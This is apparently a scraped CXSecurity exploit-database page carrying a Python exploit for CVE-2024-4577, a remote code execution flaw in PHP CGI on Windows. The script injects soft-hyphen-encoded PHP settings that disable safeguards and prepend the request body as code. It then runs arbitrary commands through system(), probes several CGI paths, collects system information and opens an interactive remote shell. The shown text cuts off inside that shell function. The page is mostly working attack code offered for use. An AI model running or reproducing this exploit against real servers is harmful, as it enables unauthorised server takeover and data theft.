---
title: PHP CGI Module 8.3.4 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025070001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-02
fetch_date: 2025-10-06T23:16:30.969146
---

# PHP CGI Module 8.3.4 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PHP CGI Module 8.3.4 Remote Code Execution** **2025.07.01**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-4577](https://cxsecurity.com/cveshow/CVE-2024-4577/ "Click to see CVE-2024-4577")**  CWE: **N/A** | |

#!/usr/bin/env python3
# Exploit Title: PHP CGI Module 8.3.4 - Remote Code Execution (RCE)
# Date: 2025-06-13
# Exploit Author: @ibrahimsql
# Exploit Author's github: https://github.com/yigitsql ( old account banned )
# Vendor Homepage: https://www.php.net/
# Software Link: https://www.php.net/downloads
# Version: PHP < 8.3.4, PHP < 8.2.17, PHP < 8.1.27
# Tested on: Kali Linux 2024.1
# CVE: CVE-2024-4577
# Description:
# A critical vulnerability in PHP's CGI implementation allows remote attackers to execute
# arbitrary code through command injection. The vulnerability exists due to improper handling
# of command-line arguments in PHP CGI, which can be exploited to bypass security restrictions
# and execute arbitrary commands with the privileges of the web server. This vulnerability
# affects all PHP versions before 8.3.4, 8.2.17, and 8.1.27.
#
# Impact:
# - Remote Code Execution (RCE)
# - Information Disclosure
# - Server Compromise
#
# References:
# - https://nvd.nist.gov/vuln/detail/cve-2024-4577
# - https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure
# - https://www.tarlogic.com/blog/cve-2024-4577-critical-vulnerability-php/
# - https://learn.microsoft.com/en-us/answers/questions/1725847/php-8-3-vulnerability-cve-2024-4577
# - https://www.stormshield.com/news/security-alert-php-cve-2024-4577-stormshields-product-response/
#
# Requirements: urllib3>=1.26.0, rich, requests>=2.25.0, alive\_progress, concurrent.futures
import re
import sys
import base64
import requests
import argparse
from rich.console import Console
from urllib3 import disable\_warnings
from urllib3.exceptions import InsecureRequestWarning
from alive\_progress import alive\_bar
from concurrent.futures import ThreadPoolExecutor, as\_completed
disable\_warnings(InsecureRequestWarning)
console = Console()
class PHPCGIExploit:
"""CVE-2024-4577 PHP CGI Argument Injection RCE Exploit"""
def \_\_init\_\_(self):
self.headers = {
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
# Optimized settings for PHP CGI argument injection
self.php\_settings = [
"-d cgi.force\_redirect=0",
"-d cgi.redirect\_status\_env=0",
"-d fastcgi.impersonate=1",
"-d open\_basedir=",
"-d disable\_functions=",
"-d auto\_prepend\_file=php://input",
"-d allow\_url\_include=1",
"-d allow\_url\_fopen=1"
]
# Soft hyphen character for Windows systems
self.soft\_hyphen = "%AD" # 0xAD character
# Different PHP CGI paths to try
self.cgi\_paths = [
"/php-cgi/php-cgi.exe",
"/php/php-cgi.exe",
"/cgi-bin/php-cgi.exe",
"/php-cgi.exe",
"/php.exe",
"/php/php.exe"
]
def ascii\_art(self):
print("")
console.print("[bold red] \_\_\_\_ \_ \_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_[/bold red]")
console.print("[bold red] | \_ \| | | | \_ \ / \_\_\_|/ \_\_\_|\_ \_|[/bold red]")
console.print("[bold red] | |\_) | |\_| | |\_) | | | | | \_ | |[/bold red]")
console.print("[bold red] | \_\_/| \_ | \_\_/ | |\_\_\_| |\_| || |[/bold red]")
console.print("[bold red] |\_| |\_| |\_|\_| \\_\_\_\_|\\_\_\_\_|\_\_\_|[/bold red]")
console.print("[bold yellow] CVE-2024-4577 Exploit[/bold yellow]")
console.print("[dim white] PHP CGI Argument Injection[/dim white]")
console.print("[dim cyan] Developer: @ibrahimsql[/dim cyan]")
print("")
def build\_payload\_url(self, cgi\_path):
# Argument injection with soft hyphen
settings\_str = " ".join(self.php\_settings).replace("-", self.soft\_hyphen)
settings\_str = settings\_str.replace("=", "%3D").replace(" ", "+")
return f"{cgi\_path}?{settings\_str}"
def execute\_command(self, target, command="whoami", cgi\_path=None):
"""Execute command on target using PHP CGI argument injection"""
try:
# Create PHP code
php\_code = f"""<?php
error\_reporting(0);
echo '[START]';
system('{command}');
echo '[END]';
die();
?>"""
# If no CGI path specified, try all paths
if cgi\_path:
paths\_to\_try = [cgi\_path]
else:
paths\_to\_try = self.cgi\_paths
for path in paths\_to\_try:
try:
payload\_url = self.build\_payload\_url(path)
full\_url = f"{target.rstrip('/')}{payload\_url}"
response = requests.post(
full\_url,
headers=self.headers,
data=php\_code,
timeout=10,
verify=False,
allow\_redirects=False
)
# Check output
if response.status\_code == 200:
output\_match = re.search(r'\[START\](.\*?)\[END\]', response.text, re.DOTALL)
if output\_match:
return output\_match.group(1).strip(), path
except requests.exceptions.RequestException:
continue
return None, None
except Exception as e:
console.print(f"[red][-][/red] Error: {str(e)}")
return None, None
def check\_vulnerability(self, target):
"""Check if target is vulnerable"""
console.print(f"[blue][\*][/blue] Testing target: {target}")
# Test with a simple command
result, cgi\_path = self.execute\_command(target, "echo CVE-2024-4577-TEST")
if result and "CVE-2024-4577-TEST" in result:
console.print(f"[green][+][/green] Target is vulnerable! CGI Path: {cgi\_path}")
# Get system information
sys\_info, \_ = self.execute\_command(target, "systeminfo", cgi\_path)
if sys\_info:
console.print("[green][+][/green] System Information:")
console.print(f"[dim]{sys\_info[:500]}...[/dim]") # First 500 characters
return True, cgi\_path
else:
console.print(f"[red][-][/red] Target is not vulnerable")
return False, None
def interactive\_shell(self, target, cgi\_path):
"""Interactive shell session - Simple version"""
console.print("[green][+][/green] Interactive shell opened")
console.print("[yellow][!][/yellow] Type 'exit' to quit, 'clear' to clear screen")
while True:
try:
# Simple input prompt
cmd = input("shell> ")
if cmd.lower() == "exit":
break
elif cmd.lower() == "clear":
print("\033[2J\033[H", end="")
continue
elif cmd.strip() == "":
continue
# Execute command
result, \_ = self.execute\_command(target, cmd, cgi\_path)...